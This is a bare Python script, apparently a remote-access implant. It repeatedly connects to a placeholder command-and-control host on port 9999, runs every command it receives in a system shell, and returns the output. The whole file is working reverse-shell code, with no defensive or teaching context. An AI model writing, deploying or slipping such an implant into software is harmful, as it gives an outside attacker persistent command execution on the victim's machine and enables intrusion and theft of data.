import socket
import subprocess
import time

C2C_HOST = "IP_PUBLIC_C2C"
C2C_PORT = 9999

def connect():
    while True:
        try:
            print("[*] Connecting to C2C...")
            sock = socket.create_connection((C2C_HOST, C2C_PORT))
            print("[+] Successfully connected to C2C")

            while True:
                data = sock.recv(4096)
                if not data:
                    print("[-] C2C closed the connection, retrying...")
                    break

                cmd = data.decode().strip()
                if not cmd:
                    continue

                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True, timeout=30
                    )
                    output = result.stdout if result.stdout else (result.stderr if result.stderr else "(no output)")
                except Exception as e:
                    output = str(e)

                sock.sendall(output.encode())

        except Exception as e:
            print(f"[-] Connection error: {e}")

        time.sleep(5)

if __name__ == "__main__":
    connect()